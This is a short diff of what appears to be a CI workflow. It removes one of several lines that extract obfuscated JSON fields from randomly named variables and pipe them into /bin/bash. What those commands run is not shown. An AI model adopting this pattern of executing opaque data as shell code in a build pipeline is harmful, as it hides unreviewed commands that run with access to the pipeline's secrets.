@@ -23,7 +23,6 @@ jobs:
           echo $zudu57540 | jq -r .krjz827 | /bin/bash
           echo $yrn0 | jq -r .zqnue55 | /bin/bash
           echo $h6035 | jq -r .be05999 | /bin/bash
-          printf '%s' "$gk3300" | jq -r .uh07832 | /bin/bash
           printf '%s' "$rqwul1" | jq -r .xui300 | /bin/bash
 
       - name: Store output
